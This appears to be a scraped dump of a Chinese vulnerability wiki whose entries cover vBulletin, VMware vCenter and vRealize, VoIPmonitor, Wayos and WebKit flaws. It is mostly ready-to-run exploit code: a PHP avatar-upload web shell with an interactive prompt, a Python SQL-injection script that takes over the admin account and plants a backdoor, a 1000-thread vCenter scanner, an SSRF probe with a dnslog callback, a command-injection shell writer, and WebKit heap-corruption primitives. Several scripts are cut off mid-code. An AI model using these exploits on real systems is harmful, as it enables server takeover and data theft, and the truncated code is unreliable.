\"\\nExample....: php $argv[0] http://localhost/vb/ user passwd\"; print \"\\nExample....: php $argv[0] [url]https://vbulletin.com/[/url] evil hacker\\n\\n\"; die(); } list($url, $user, $pass) = [$argv[1], $argv[2], $argv[3]]; $ch = curl_init(); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_HEADER, true); print \"\\n[-] Logging in with username '{$user}' and password '{$pass}'\\n\"; curl_setopt($ch, CURLOPT_URL, $url); if (!preg_match(\"/Cookie: .*sessionhash=[^;]+/\", curl_exec($ch), $sid)) die(\"[-] Session ID not found!\\n\"); curl_setopt($ch, CURLOPT_URL, \"{$url}?routestring=auth/login\"); curl_setopt($ch, CURLOPT_HTTPHEADER, $sid); curl_setopt($ch, CURLOPT_POSTFIELDS, \"username={$user}&password={$pass}\"); if (!preg_match(\"/Cookie: .*sessionhash=[^;]+/\", curl_exec($ch), $sid)) die(\"[-] Login failed!\\n\"); print \"[-] Logged-in! Retrieving security token...\\n\"; curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, false); curl_setopt($ch, CURLOPT_HTTPHEADER, $sid); if (!preg_match('/token\": \"([^\"]+)\"/', curl_exec($ch), $token)) die(\"[-] Security token not found!\\n\"); print \"[-] Uploading new avatar...\\n\"; $params = [\"profilePhotoFile\" => new CURLFile(\"avatar.jpeg\"), \"securitytoken\" => $token[1]]; curl_setopt($ch, CURLOPT_URL, \"{$url}?routestring=profile/upload-profilepicture\"); curl_setopt($ch, CURLOPT_POSTFIELDS, $params); curl_setopt($ch, CURLOPT_HEADER, false); if (($path = (json_decode(curl_exec($ch)))->avatarpath) == null) die(\"[-] Upload failed!\\n\"); if (preg_match('/image\\.php\\?/', $path)) die(\"[-] Sorry, the 'Save Avatars as Files' option is disabled!\\n\"); print \"[-] Updating avatar with PHP shell...\\n\"; $php_code = ''; $params = [\"routestring\" => \"ajax/api/user/updateAvatar\", \"userid\" => 0, \"avatarid\" => 0, \"data[extension]\" => \"php\", \"data[filedata]\" => $php_code, \"securitytoken\" => $token[1]]; curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params)); if (curl_exec($ch) !== \"true\") die(\"[-] Update failed!\\n\"); print \"[-] 上传shell中...\\n\"; preg_match('/(\\d+)\\.jpeg/', $path, $m); $path = preg_replace('/(\\d+)\\.jpeg/', ($m[1]+1).\".php\", $path); curl_setopt($ch, CURLOPT_URL, \"{$url}core/{$path}\"); curl_setopt($ch, CURLOPT_POST, false); while(1) { print \"\\nvb-shell# \"; if (($cmd = trim(fgets(STDIN))) == \"exit\") break; curl_setopt($ch, CURLOPT_HTTPHEADER, [\"CMD: \".base64_encode($cmd)]); preg_match('/____(.*)/s', curl_exec($ch), $m) ? print $m[1] : die(\"\\n[-] Exploit failed!\\n\"); Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:41 "},"Web安全/vBulletin/（CVE-2020-12720）vBulletin  未授权sql注入漏洞/（CVE-2020-12720）vBulletin  未授权sql注入漏洞.html":{"url":"Web安全/vBulletin/（CVE-2020-12720）vBulletin  未授权sql注入漏洞/（CVE-2020-12720）vBulletin  未授权sql注入漏洞.html","title":"（CVE-2020-12720）vBulletin  未授权sql注入漏洞","keywords":"","body":"（CVE-2020-12720）vBulletin 未授权sql注入漏洞 一、漏洞简介 未经授权的用户可以通过SQL注入获取敏感数据 二、漏洞影响 vBulletin 5.5.6pl1之前版本 vBulletin 5.6.0pl1之前的5.6.0版本 vBulletin 5.6.1pl1之前的5.6.1版本 三、复现过程 漏洞分析 漏洞文件：/core/vb/library/content.php vBulletin未授权sql注入漏洞/media/rId25.png) 跟进fillContentTableData方法，直接调用了getRow方法 vBulletin未授权sql注入漏洞/media/rId26.png) 此处getRow方法传入的第一个参数为\\'vBForum:getContentTablesData\\'，全局搜索getContentTablesData方法 vBulletin未授权sql注入漏洞/media/rId27.png) nodeid被设置为常量TYPE_NOCLEAN的值，该值为0。 跟进cleanArray方法 vBulletin未授权sql注入漏洞/media/rId28.png) 变量vartype经过数组处理后即为TYPE_NOCLEAN，随后调用doClean方法进行数据清洗 vBulletin未授权sql注入漏洞/media/rId29.png) doClean方法会根据传入的type数值进入到不同的分支进行处理，因为变量vartype为0直接进入到TYPE_NOCLEAN的分支，从而不做清洗处理。 再回到/core/packages/vbforum/db/mysql/querydefs.php文件中，发现后续并没有再对nodeid键值进行处理，直接拼接到SQL语句中，造成了SQL注入漏洞。 vBulletin未授权sql注入漏洞/media/rId30.png) 至于如何利用，就不赘述了，向上追溯调用链即可。 漏洞复现 nodeId[nodeid]=1 AND text.nodeid = 1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,user(),19,20,21,22,23,24,25,26-- vBulletin未授权sql注入漏洞/media/rId32.png)打个断点就能快速定位漏洞点vBulletin未授权sql注入漏洞/media/rId33.png) poc CVE-2020-12720.py # Exploit Title: vBulletin 5.6.1 - 'nodeId' SQL Injection # Date: 2020-05-15 # Exploit Author: Photubias # Vendor Advisory: [1] https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4440032-vbulletin-5-6-1-security-patch-level-1 # Version: vBulletin v5.6.x (prior to Patch Level 1) # Tested on: vBulletin v5.6.1 on Debian 10 x64 # CVE: CVE-2020-12720 vBulletin v5.6.1 (SQLi) with path to RCE #!/usr/bin/env python3 ''' Copyright 2020 Photubias(c) This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version. This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details. You should have received a copy of the GNU General Public License along with this program. If not, see . File name CVE-2020-12720.py written by tijl[dot]deneut[at]howest[dot]be for www.ic4.be This is a native implementation without requirements, written in Python 3. Works equally well on Windows as Linux (as MacOS, probably ;-) ##-->> Full creds to @zenofex and @rekter0 ') print(' Example: ./CVE-2020-12720.py http://192.168.50.130/ \"cat /etc/passwd\"') print(' But for now, ask questions then') sURL = input('[?] Please enter the address and path to vBulletin ([http://192.168.50.130/): ') if sURL == '': sURL = 'http://192.168.50.130' else: sURL = sys.argv[1] sCMD = sys.argv[2] if not sURL[:-1] == '/': sURL += '/' if not sURL[:4].lower() == 'http': sURL = 'http://' + sURL print('[+] Welcome, first verifying the SQLi vulnerability') if verifyBug(sURL): print(\"----\\n\" + '[+] Attempting automatic admin account takeover') sUSERID = takeoverAccount(sURL, sNEWPASS) sADMINPASS = sNEWPASS if sUSERID == '': sUSERID = '1' sADMINPASS = input('[?] Please enter the admin password (userid ' + sUSERID + '): ') else: sADMINPASS = input('[?] Please enter the admin password (userid ' + sUSERID + '): ') print(\"----\\n\"+'[+] So far so good, attempting the creation of the backdoor') sPageName = createBackdoor(sURL, sADMINPASS, sUSERID) if len(sys.argv) == 1: sCMD = input('[?] Please enter the command to run [id]: ') if sCMD == '': sCMD = 'id' sCmd = urllib.parse.quote(sCMD) sPath = sPageName + \"?cmd=\" + sCmd print('[+] Opening '+sURL + sPath) try: oRequest = urllib.request.Request(url = sURL + sPath) oResponse = oOpener.open(oRequest, timeout = iTimeout) print('#######################') sResponse = oResponse.read().decode() print('[+] Command result:') print(sResponse.split('###SHELLRESULT###')[1]) except: print('[-] Something went wrong, bad command?') sys.exit(1) if __name__ == \"__main__\": main() 参考链接 https://mp.weixin.qq.com/s/U-MiFkBiY6fF44xfwAV-Ng Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:42 "},"Web安全/Vmware vCenter/CVE-2021-21972 vCenter 6.5-7.0 RCE 漏洞检测POC/CVE-2021-21972 vCenter 6.5-7.0 RCE 漏洞检测POC.html":{"url":"Web安全/Vmware vCenter/CVE-2021-21972 vCenter 6.5-7.0 RCE 漏洞检测POC/CVE-2021-21972 vCenter 6.5-7.0 RCE 漏洞检测POC.html","title":"CVE-2021-21972 vCenter 6.5-7.0 RCE 漏洞检测POC","keywords":"","body":"CVE-2021-21972 vCenter 6.5-7.0 RCE 漏洞检测POC poc如下 import requests import threading import warnings warnings.filterwarnings(\"ignore\") headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\", } def run(thread_function, *args): threads = [] for par in args[0]: thread = threading.Thread(target=thread_function, args=par) threads.append(thread) thread.start() for t in threads: t.join() def poc(*args): try: url = args[0] url1 = url + '/ui/vropspluginui/rest/services/getstatus' url1 = url1[:7] + url1[7:].replace(\"//\", \"/\") res = requests.get(url1, headers=headers, verify=False, timeout=5) if res.status_code == 200 and '{\"States\":' in res.text: print([url, url1, \"存在漏洞：Unauthorized RCE in VMware vCenter\", res.text[:50]]) return True url2 = url + '/ui/vropspluginui/rest/services/uploadova' url2 = url2[:7] + url2[7:].replace(\"//\", \"/\") res = requests.post(url2, headers=headers, verify=False, timeout=5) if res.status_code == 500 and '{\"stackTrace\":' in res.text: print([url, url2, \"存在漏洞：Unauthorized RCE in VMware vCenter\", res.text[:50]]) return True except: pass with open(\"url.txt\") as f: urllist = [(i.strip(),) for i in f.readlines()] # print(urllist) thread_num = 1000 for num in range(0, len(urllist), thread_num): start = num end = start + thread_num run(poc, urllist[start:end]) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:44 "},"Web安全/Vmware vCenter/VMware vCenter未授权任意文件读取/VMware vCenter未授权任意文件读取.html":{"url":"Web安全/Vmware vCenter/VMware vCenter未授权任意文件读取/VMware vCenter未授权任意文件读取.html","title":"VMware vCenter未授权任意文件读取","keywords":"","body":"VMware vCenter未授权任意文件读取 原文链接 https://twitter.com/ptswarm/status/1316016337550938122 在VMware vCenter中发现了一个未经身份验证的任意文件读取漏洞。VMware透露此漏洞已在6.5u1中修复，但未分配CVE \\POC\\:** http://x.x.x.x/eam/vib?id=c:\\programData\\Vmware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properti Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:45 "},"Web安全/VMware vRealize/VMware vRealize Operations Manager SSRF漏洞 CVE-2021-21975/VMware vRealize Operations Manager SSRF漏洞 CVE-2021-21975.html":{"url":"Web安全/VMware vRealize/VMware vRealize Operations Manager SSRF漏洞 CVE-2021-21975/VMware vRealize Operations Manager SSRF漏洞 CVE-2021-21975.html","title":"VMware vRealize Operations Manager SSRF漏洞 CVE-2021-21975","keywords":"","body":"VMware vRealize Operations Manager SSRF漏洞 CVE-2021-21975 漏洞描述 vRealize Operations Manager API包含服务器端请求伪造。可以通过网络访问vRealize Operations Manager API的恶意攻击者可以执行服务器端请求伪造攻击(SSRF)，以窃取管理凭据。 漏洞影响 VMware:vRealize_operations_manager: 8.0.0, 8.0.1, 8.3.0, 8.1.0, 8.1.1, 8.2.0, 7.5.0 VMware:cloud_foundation: 4.x 3.x VMware:vRealize_suite_lifecycle_manager: 8.x FOFA title=\"vRealize Operations Manager\" 漏洞复现 访问登录页面如下 发送请求包如下 POST /casa/nodes/thumbprints HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Type: application/json;charset=UTF-8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Content-Length: 24 [\"eheeyd.dnslog.cn\"] POST /casa/nodes/thumbprints HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Type: application/json;charset=UTF-8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Content-Length: 24 [\"127.0.0.1:443/ui\"] 漏洞利用POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: VMware vRealize Operations Manager \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mDnslog >>> xxx.dnslog.com \\033[0m') print('+------------------------------------------') def POC_1(target_url, v): vuln_url = target_url + \"/casa/nodes/thumbprints\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/json;charset=UTF-8\" } data = '[\"{}\"]'.format(Dnslog) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=10) if response.status_code == 200 : print(\"\\033[32m[o] 目标 {} 可能存在SSRF漏洞,请检查 Dnslog 响应 \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] 目标 {} 不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url)) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) Dnslog = str(input(\"\\033[35mDnslog >>> \\033[0m\")) POC_1(target_url, Dnslog) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:45 "},"Web安全/VoIPmonitor/VoIPmonitor RCE漏洞/VoIPmonitor RCE漏洞.html":{"url":"Web安全/VoIPmonitor/VoIPmonitor RCE漏洞/VoIPmonitor RCE漏洞.html","title":"VoIPmonitor RCE漏洞","keywords":"","body":"VoIPmonitor RCE漏洞 漏洞描述 漏洞介绍 由于函数没有进行过滤导致的命令执行 漏洞影响 VoIPmonitor 版本>=24.60 FOFA title=\"VoIPmonitor\" 漏洞分析 在源码中的config/configuration.php文件中引入了一个变量SPOOLDIR，该变量没有进行过滤，被调用时候及可造成任意命令执行。 EXP import argparse from sys import argv,exit import time import random import string try: import requests except ImportError: print(\"pip3 install requests \") print(\"\"\" ############################################### # VOIP Monitor RCE # ############################################### \"\"\") headers = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0\", \"Accept\": \"*/*\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \"Connection\": \"close\"} def get_target(args): hostname = args.host path = args.path if path: return f\"http://{hostname}/{path}/index.php\" else: return f\"http://{hostname}/index.php\" def set_tmp(args): global headers target = get_target(args) n_data = {\"SPOOLDIR\": \"/tmp\", \"recheck\": \"annen\"} set_totmp = requests.post(target, n_data, headers=headers) print(f\"[*] set /tmp {set_totmp}\") def checkVulnerability(args): global headers target = get_target(args) print(f\"[+] Attacking {target}\") testcmd = {\"SPOOLDIR\": \"test\\\".system(id).\\\"\", \"recheck\": \"annen\"} response_text = b\"uid=\" testcmd_req = requests.post(target, testcmd, verify=False, headers=headers) if response_text in testcmd_req.content: print(\"[*] host is vulnerable\") else: print(\"[-] host is not vulnerable\") exit() def uploadshell(args): global headers hostname = args.host path = args.path shell_path = \"\" shellfilename = str ( ''.join(random.choice(string.ascii_lowercase) for i in range(10)) ) target = get_target(args) rce_payload = {\"SPOOLDIR\": f\"/tmp\\\".file_put_contents('{shellfilename}.php',' Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:47 "},"Web安全/Wayos防火墙/Wayos 防火墙 密码泄露和后台命令执行漏洞/Wayos 防火墙 密码泄露和后台命令执行漏洞.html":{"url":"Web安全/Wayos防火墙/Wayos 防火墙 密码泄露和后台命令执行漏洞/Wayos 防火墙 密码泄露和后台命令执行漏洞.html","title":"Wayos 防火墙 密码泄露和后台命令执行漏洞","keywords":"","body":"Wayos 防火墙 密码泄露&&后台命令执行漏洞 漏洞描述 Wayos 防火墙 后台存在命令执行漏洞，通过命令注入可以执行远程命令 漏洞影响 Wayos 防火墙 FOFA body=\"Get_Verify_Info(hex_md5(user_string).\" 漏洞复现 登录页面如下 可以通过F12查找到密码，密码为md5加密，可是尝试去解密 登录后台后 ping 模块命令执行 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:47 "},"Web安全/Webkit/（CVE-2018-4441）Webkit shiftCountWithArrayStorage/（CVE-2018-4441）Webkit shiftCountWithArrayStorage.html":{"url":"Web安全/Webkit/（CVE-2018-4441）Webkit shiftCountWithArrayStorage/（CVE-2018-4441）Webkit shiftCountWithArrayStorage.html","title":"（CVE-2018-4441）Webkit shiftCountWithArrayStorage","keywords":"","body":"（CVE-2018-4441）Webkit shiftCountWithArrayStorage 一、漏洞简介 WebKit是Apple Safari浏览器中的Web浏览器引擎，也是其他macOS、iOS和Linux系统中应用的浏览器引擎。2018年12月，该漏洞在公开披露后，被发现影响最新版本的苹果Safari浏览器。 二、漏洞影响 三、复现过程 漏洞分析 环境配置 这里我用了补丁的前一个版本 commit 21687be235d506b9712e83c1e6d8e0231cc9adfd , 在 ubuntu 1804 下编译，环境相关的文件都放在了这里 漏洞描述 漏洞发生在JSArray::shiftCountWithArrayStorage 这个函数，根据lokihardt 的描述，除非对象的prototype 有indexed accessors 或者 proxy对象(我也不清楚是什么:( ), 否则调用到这个函数的时候holesMustForwardToPrototype 都会返回false, 本来带holes 的对象就可以进入下面的处理逻辑(总的来说就是代码写错了) bool JSArray::shiftCountWithArrayStorage(VM& vm, unsigned startIndex, unsigned count, ArrayStorage* storage) { unsigned oldLength = storage->length(); RELEASE_ASSERT(count hasHoles() && this->structure(vm)->holesMustForwardToPrototype(vm, this)) || hasSparseMap() || shouldUseSlowPut(indexingType())) { return false; } if (!oldLength) return true; unsigned length = oldLength - count; storage->m_numValuesInVector -= count; storage->setLength(length); //..... bool Structure::holesMustForwardToPrototype(VM& vm, JSObject* base) const { ASSERT(base->structure(vm) == this); if (this->mayInterceptIndexedAccesses()) return true; JSValue prototype = this->storedPrototype(base);// if (!prototype.isObject()) return false; JSObject* object = asObject(prototype); while (true) { Structure& structure = *object->structure(vm); if (hasIndexedProperties(object->indexingType()) || structure.mayInterceptIndexedAccesses()) return true; prototype = structure.storedPrototype(object); if (!prototype.isObject()) return false; object = asObject(prototype); poc 分析 function main() { let arr = [1]; arr.length = 0x100000; arr.splice(0, 0x11); arr.length = 0xfffffff0; arr.splice(0xfffffff0, 0, 1); } main(); lokihardt 给出了poc ./jsc >>> a=[1] 1 >>> describe(a) Object: 0x7fffaf6b4340 with butterfly 0x7fe0000e4008 (Structure 0x7fffaf6f2a00:[Array, {}, ArrayWithInt32, Proto:0x7fffaf6c80a0, Leaf]), StructureID: 97 >>> a.length=0x100000 1048576 >>> describe(a) Object: 0x7fffaf6b4340 with butterfly 0x7fe0000f8448 (Structure 0x7fffaf6f2b50:[Array, {}, ArrayWithArrayStorage, Proto:0x7fffaf6c80a0, Leaf]), StructureID: 100 >>> a.splice(0,0x11) 1,,,,,,,,,,,,,,,, 首先创建了一个 ArrayWithInt32 类型的array, length 改成0x100000 之后会转换成ArrayWithArrayStorage, 然后调用 splice 函数，实现在Source/JavaScriptCore/runtime/ArrayPrototype.cpp:1005 的arrayProtoFuncSplice 函数 splice 用来删除修改array, 如 a.splice(0, 0x11), 就表示从index=0 开始删除0x11 项， 第三个参数表示要替换的内容， 如a.splice(0,0x11,1,1) 表示删除 0x11 个项，然后添加两个项，内容都是1, 也可以这a.splice(0,1,1,2,3) 要添加的项比删除多的时候会重新分配内存。我们看一下函数具体是怎么样实现的， 这里用poc 的 a.length=0x100000; a.splice(0,0x11) 为例 EncodedJSValue JSC_HOST_CALL arrayProtoFuncSplice(ExecState* exec) { // 15.4.4.12 VM& vm = exec->vm(); auto scope = DECLARE_THROW_SCOPE(vm); JSObject* thisObj = exec->thisValue().toThis(exec, StrictMode).toObject(exec); EXCEPTION_ASSERT(!!scope.exception() == !thisObj); if (UNLIKELY(!thisObj)) return encodedJSValue(); // length = 0x100000 unsigned length = toLength(exec, thisObj); RETURN_IF_EXCEPTION(scope, encodedJSValue()); if (!exec->argumentCount()) { //.. } // splice 第一个参数， 这里是 0 unsigned actualStart = argumentClampedIndexFromStartOrEnd(exec, 0, length); RETURN_IF_EXCEPTION(scope, encodedJSValue()); // actualDeleteCount = 0x100000 - 0 unsigned actualDeleteCount = length - actualStart; // argumentCount == 2, 进入判断， actualDeleteCount = 0x11 if (exec->argumentCount() > 1) { double deleteCount = exec->uncheckedArgument(1).toInteger(exec); RETURN_IF_EXCEPTION(scope, encodedJSValue()); if (deleteCount length - actualStart) actualDeleteCount = length - actualStart; else actualDeleteCount = static_cast(deleteCount); } //... // itemCount 表示要添加的 item 数量， 这里是 0 调用 shift unsigned itemCount = std::max(exec->argumentCount() - 2, 0); if (itemCount (exec, thisObj, actualStart, actualDeleteCount, itemCount, length); RETURN_IF_EXCEPTION(scope, encodedJSValue()); } else if (itemCount > actualDeleteCount) { unshift(exec, thisObj, actualStart, actualDeleteCount, itemCount, length); RETURN_IF_EXCEPTION(scope, encodedJSValue()); } // 把每个添加的item 内容写入 for (unsigned k = 0; k putByIndexInline(exec, k + actualStart, exec->uncheckedArgument(k + 2), true); RETURN_IF_EXCEPTION(scope, encodedJSValue()); } // 重新设置长度 scope.release(); setLength(exec, vm, thisObj, length - actualDeleteCount + itemCount); return JSValue::encode(result); } 整理一下 actualStart 第一个参数，表示要开始delete 的地方 actualDeleteCount 第二个参数，要delete 的数量，没有设置时默认是length - actualStart itemCount 第三个参数开始的数量 itemCount 会调用 shift itemCount > actualDeleteCount 调用 unshift 我们跟一下shift template void shift(ExecState* exec, JSObject* thisObj, unsigned header, unsigned currentCount, unsigned resultCount, unsigned length) { VM& vm = exec->vm(); auto scope = DECLARE_THROW_SCOPE(vm); RELEASE_ASSERT(currentCount > resultCount); // 要多 delete 的数量 unsigned count = currentCount - resultCount; RELEASE_ASSERT(header length() == length && array->shiftCount(exec, header, count)) return; } for (unsigned k = header; k putByIndexInline(exec, to, value, true); RETURN_IF_EXCEPTION(scope, void()); } else { bool success = thisObj->methodTable(vm)->deletePropertyByIndex(thisObj, exec, to); RETURN_IF_EXCEPTION(scope, void()); if (!success) { throwTypeError(exec, scope, UnableToDeletePropertyError); return; } } } for (unsigned k = length; k > length - count; --k) { // bool success = thisObj->methodTable(vm)->deletePropertyByIndex(thisObj, exec, k - 1); RETURN_IF_EXCEPTION(scope, void()); if (!success) { throwTypeError(exec, scope, UnableToDeletePropertyError); return; } } } JSArray::ShiftCountForSplice` 实现在`Source/JavaScriptCore/runtime/JSArray.h:125`, `shiftCountWithAnyIndexingType` 根据 array 的类型做不同的处理，这里我们是`ArrayWithArrayStorage`, 直接调用`shiftCountWithArrayStorage bool shiftCountForSplice(ExecState* exec, unsigned& startIndex, unsigned count) { return shiftCountWithAnyIndexingType(exec, startIndex, count); } //................. bool JSArray::shiftCountWithAnyIndexingType(ExecState* exec, unsigned& startIndex, unsigned count) { VM& vm = exec->vm(); RELEASE_ASSERT(count > 0); ensureWritable(vm); Butterfly* butterfly = this->butterfly(); switch (indexingType()) { case ArrayClass: return true; case ArrayWithUndecided: // Don't handle this because it's confusing and it shouldn't come up. return false; case ArrayWithInt32: case ArrayWithContiguous: { unsigned oldLength = butterfly->publicLength(); //... return true; } case ArrayWithDouble: { unsigned oldLength = butterfly->publicLength(); RELEASE_ASSERT(count 这里就是漏洞点了，前面提到holesMustForwardToPrototype 会返回false, 这样就会进入到后面的逻辑 bool JSArray::shiftCountWithArrayStorage(VM& vm, unsigned startIndex, unsigned count, ArrayStorage* storage) { unsigned oldLength = storage->length(); RELEASE_ASSERT(count hasHoles() && this->structure(vm)->holesMustForwardToPrototype(vm, this)) || hasSparseMap() || shouldUseSlowPut(indexingType())) { return false; } if (!oldLength) return true; //count = 0x11, oldlength = 0x100000, length = 0xfffef unsigned length = oldLength - count; // m_numValuesInVector = 1, 计算之后 m_numValuesInVector = 0xfffffff0 storage->m_numValuesInVector -= count; storage->setLength(length); 这里运行结束后a.length = 0xfffef, storage.m_numValuesInVector = 0xfffffff0, 然后 poc 下一步设置a.length = 0xfffffff0, 这样就有 a.length == storage.m_numValuesInVector, 这样hasHoles 后续都会返回false bool hasHoles() const { return m_numValuesInVector != length(); } 最后一步a.splice(0xfffffff0, 0, 1);, itemCount == 1 > actualDeleteCount == 0, 于是就会进入 unshift 函数， 和 shift 函数类似，这里最终会进入 JSArray 的unshiftCountWithArrayStorage 因为 storage->hasHoles() 返回的是 false, 所以可以进入后面的判断，要添加的item 比 delete的多，那么就需要扩大原来的内存，后续的内存操作会出现问题，最终segmentfault bool JSArray::unshiftCountWithArrayStorage(ExecState* exec, unsigned startIndex, unsigned count, ArrayStorage* storage) { //.. // If the array contains holes or is otherwise in an abnormal state, // use the generic algorithm in ArrayPrototype. if (storage->hasHoles() || storage->inSparseMode() || shouldUseSlowPut(indexingType())) return false; bool moveFront = !startIndex || startIndex vectorLength(); // Need to have GC deferred around the unshiftCountSlowCase(), since that leaves the butterfly in // a weird state: some parts of it will be left uninitialized, which we will fill in here. DeferGC deferGC(vm.heap); auto locker = holdLock(cellLock()); if (moveFront && storage->m_indexBias >= count) { Butterfly* newButterfly = storage->butterfly()->unshift(structure(vm), count); storage = newButterfly->arrayStorage(); storage->m_indexBias -= count; storage->setVectorLength(vectorLength + count); setButterfly(vm, newButterfly); } else if (!moveFront && vectorLength - length >= count) storage = storage->butterfly()->arrayStorage(); else if (unshiftCountSlowCase(locker, vm, deferGC, moveFront, count)) storage = arrayStorage();// 0x60 else { throwOutOfMemoryError(exec, scope); return true; } WriteBarrier* vector = storage->m_vector; if (startIndex) { if (moveFront) memmove(vector, vector + count, startIndex * sizeof(JSValue)); else if (length - startIndex) memmove(vector + startIndex + count, vector + startIndex, (length - startIndex) * sizeof(JSValue)); } for (unsigned i = 0; i 漏洞利用 okay， 漏洞发生的原因大概清楚了，我们再来看看要怎么样利用。我们可以发现 unshiftCountWithArrayStorage 有一个 memmove 的操作， 假如执行a.splice(0x1000,0,1), startIndex == 0x1000, moveFront == true , count = 1 if (startIndex) { if (moveFront) memmove(vector, vector + count, startIndex * sizeof(JSValue)); else if (length - startIndex) memmove(vector + startIndex + count, vector + startIndex, (length - startIndex) * sizeof(JSValue)); } vector 来自前面的storage , 这里会进入 storage = arrayStorage(); 重新初始化一个 storage, 可以跟踪一下Source/JavaScriptCore/runtime/ButterflyInlines.h:77 的Butterfly::tryCreateUninitialized 函数，最终分配的内存大小是 0x60(0x58 向上对齐)。但是 因为这里startIndex 可以控制，于是这里就可以越界做内存拷贝。 if (moveFront && storage->m_indexBias >= count) {//m_indexBias ==0 butterfly()->unshift(structure(vm), count); storage = newButterfly->arrayStorage(); storage->m_indexBias -= count; storage->setVectorLength(vectorLength + count); setButterfly(vm, newButterfly); } else if (!moveFront && vectorLength - length >= count)// moveFront == true storage = storage->butterfly()->arrayStorage(); else if (unshiftCountSlowCase(locker, vm, deferGC, moveFront, count)) storage = arrayStorage();// 0x60 else { throwOutOfMemoryError(exec, scope); return true; } WriteBarrier* vector = storage->m_vector; 如果内存布局像下面这样, vector = 0x7fe000287a78 pwndbg> x/1000gx 0x7fe000287a78 0x7fe000287a78: 0x00000000badbeef0 0x0000000000000000 0x7fe000287a88: 0x00000000badbeef0 0x00000000badbeef0 0x7fe000287a98: 0x00000000badbeef0 0x00000000badbeef0 //.. // 其他 object 的 butterfly, length = 0xa 0x7fe000287ff8: 0x00000000badbeef0 0x0000000d0000000a 0x7fe000288008: 0x0000000000001337 0x402abd70a3d70a3d 0x7fe000288018: 0x402abd70a3d70a3d 0x402abd70a3d70a3d // vector + 0x1000 0x7fe000288a78: 0x0000000000000000 0x0000000d0000000a 0x7fe000288a88: 0x0000000000001337 0x402abd70a3d70a3d memmove之后, 可以把其他object 的 buttefly 的 length 改了，假如可以找到这个 object， 那么就可以利用这个 object 来构造越界读写了。 // vector 0x7fe000287a78: 0x0000000000000000 0x00000000badbeef0 0x7fe000287a88: 0x00000000badbeef0 0x00000000badbeef0 // 其他 object 的 butterfly, length = 0x1337 0x7fe000287ff8: 0x0000000d0000000a 0x0000000000001337 0x7fe000288008: 0x402abd70a3d70a3d 0x402abd70a3d70a3d // vector + 0x1000 0x7fe000288a78: 0x0000000d0000000a 0x0000000000001337 0x7fe000288a88: 0x402abd70a3d70a3d 0x402abd70a3d70a3d addrof 和 fakeobj 构造 首先喷一堆的object， 尝试构造出上面提到的内存布局，length都是 10， 这样新分配的内存就是 10 * 8 + 0x10 = 0x60, 就会和新申请的storage 分配在十分接近的内存上。 spray[i] 和 spray[i+1] 会连续分配 for (let i = 0; i 然后是 splice(0x1000,0,1) 触发memmove, 然后找出那个被改了 size 的 object arr.splice(0x1000,0,1); fake_index=-1; for(let i=0;i到了这里, spray[i][14] == spray[i+1][0], 往spray[i][14] 写一个 地址， 然后从spray[i+1] 取出来就会认为他是一个object, 同样可以用spray[i][14] 读 object 的地址， fakeobj 和 addrof 的构造就十分直接啦 unboxed = spray[fake_index]; boxed = spray[fake_index+1]; print(describe(unboxed)) print(describe(boxed)) 